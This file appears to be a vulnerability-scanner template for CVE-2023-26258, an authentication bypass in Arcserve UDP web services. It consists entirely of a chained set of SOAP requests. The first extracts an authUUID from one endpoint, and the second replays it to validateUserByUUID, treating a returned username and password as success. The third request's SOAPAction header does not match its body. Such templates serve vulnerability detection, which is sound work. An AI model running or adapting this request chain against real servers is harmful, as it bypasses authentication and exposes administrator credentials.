templates/apache/cve-2023-26258.yml

cve-id: CVE-2023-26258
severity: critical
type: auth-bypass
rules:
- method: POST
  path: /WebServiceImpl/services/FlashServiceImpl
  expression: response.status == 200 && response.content_type.contains("text/xml") && response.body.bcontains(b"ns5:authUUID")
  search: <ns5:authUUID>(?P<auth_uuid>[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})</ns5:authUUID>
  headers:
    Content-Type: text/xml
  body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<S:Envelope xmlns:S=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <S:Body>\n    <ns2:getVersionInfo\n        xmlns:ns2=\"http://webservice.arcflash.ca.com\"\n        xmlns:ns3=\"http://backup.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns4=\"http://data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns5=\"http://export.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns6=\"http://vsphere.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns7=\"http://browse.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns8=\"http://restore.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns9=\"http://catalog.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns10=\"http://activitylog.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns11=\"http://remotedeploy.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns12=\"http://history.job.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns13=\"http://webservice.edge.arcserve.ca.com/\"/>\n  </S:Body>\n</S:Envelope>"
- method: POST
  path: /WebServiceImpl/services/VirtualStandbyServiceImpl
  expression: response.status == 200 && response.content_type.contains("text/xml") && response.body.bcontains(b"ns5:uuid") && response.body.bcontains(b"ns5:userName") && response.body.bcontains(b"ns5:password")
  headers:
    SOAPAction: '"<http://webservice.arcflash.ca.com/IEdgeDashboardService/validateUserByUUIDRequest>"'
    Content-Type: text/xml
  body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<S:Envelope xmlns:S=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <S:Body>\n    <ns2:validateUserByUUID\n        xmlns:ns2=\"http://webservice.arcflash.ca.com\"\n        xmlns:ns3=\"http://backup.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns4=\"http://data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns5=\"http://export.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns6=\"http://vsphere.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns7=\"http://browse.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns8=\"http://restore.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns9=\"http://catalog.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns10=\"http://activitylog.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns11=\"http://remotedeploy.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns12=\"http://history.job.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns13=\"http://webservice.edge.arcserve.ca.com/\">\n        <arg0>{{auth_uuid}}</arg0>\n    </ns2:validateUserByUUID>\n  </S:Body>\n</S:Envelope>"
- method: POST
  path: /WebServiceImpl/services/FlashServiceImpl
  expression: response.status == 200 && response.content_type.contains("text/xml") && response.body.bcontains(b"ns5:uuid") && response.body.bcontains(b"ns5:userName") && response.body.bcontains(b"ns5:password")
  headers:
    SOAPAction: '"<http://webservice.arcflash.ca.com/IFlashService_R16_5/getVersionInfoRequest>"'
    Content-Type: text/xml
  body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <S:Envelope xmlns:S=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <S:Body>\n      <ns2:getLocalHostAsTrust\n        xmlns:ns2=\"http://webservice.arcflash.ca.com\"\n        xmlns:ns3=\"http://backup.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns4=\"http://data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns5=\"http://export.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns6=\"http://vsphere.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns7=\"http://browse.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns8=\"http://restore.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns9=\"http://catalog.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns10=\"http://activitylog.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns11=\"http://remotedeploy.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns12=\"http://history.job.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns13=\"http://webservice.edge.arcserve.ca.com/\"\n      >\n      </ns2:getLocalHostAsTrust>\n    </S:Body>\n  </S:Envelope>"
